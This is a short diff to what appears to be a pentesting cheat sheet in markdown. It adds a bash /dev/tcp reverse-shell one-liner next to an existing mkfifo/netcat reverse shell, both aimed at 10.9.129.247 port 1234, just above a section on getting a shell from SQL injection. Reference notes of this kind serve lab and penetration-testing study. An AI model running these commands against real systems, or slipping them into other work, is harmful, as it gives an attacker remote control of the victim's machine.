@@ -122,6 +122,10 @@ stty raw -echo; fg
 rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.129.247 1234 >/tmp/f
 ```
 
+```sh
+/bin/bash -c '/bin/bash -i >& /dev/tcp/10.9.129.247/1234 0>&1'
+```
+
 ### Shell from SQL injection
 
 - Windows
